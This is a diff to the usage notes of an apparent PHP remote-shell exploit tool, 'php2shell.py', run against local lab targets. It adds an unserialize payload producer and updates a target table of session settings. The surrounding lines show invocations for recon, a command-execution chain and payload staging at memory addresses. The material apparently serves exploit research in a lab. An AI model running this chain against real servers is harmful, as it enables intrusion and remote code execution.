@@ -57,6 +57,7 @@ python3 -m tool --target wiki --step recon          # same via package entry
 ./tool/php2shell.py --target wiki --step chain --command id
 ./tool/php2shell.py --target wiki --step producer --body-bytes 5700000   # byte-build only, no send
 ./tool/php2shell.py --target modphp --step producer --body-bytes 262144  # byte-build only, no send
+./tool/php2shell.py --target modphp --step producer --producer unser --memory-limit 2M  # unser payload, byte-build only, no send
 ./tool/php2shell.py --target wiki --step write_stage --main-chunk 0x7f8875a00000   # byte-build only, no send
 ./tool/php2shell.py --url http://127.0.0.1:28840/index.php --profile realapps-pie --step recon
 ```
@@ -80,7 +81,7 @@ Parameterized producer/step plan: `/tmp/opencode/realapps/side/php2shell/runs/UN
 | `session.save_path` | `/tmp/opencode/realapps/sessions/wiki` | `/tmp/opencode/realapps/sessions/wp` | n/a |
 | `session.upload_progress.enabled` | 1 (compiled default) | 1 | n/a |
 | `session.upload_progress.cleanup` | 1 at runtime (diag labs override 0) | 1 | n/a |
-| producers | `producer_fpmwiki`, `producer_618`, `producer_619` | `producer_618`, `producer_619` | `producer_modphp` |
+| producers | `producer_fpmwiki`, `producer_618`, `producer_619` | `producer_618`, `producer_619` | `producer_modphp`, `producer_unser` |
 | status | run (producer wired) | run | producer wired (chain TBD) |
 
 Values as-found on the lab stack (verify per run). Add a target: new dict in
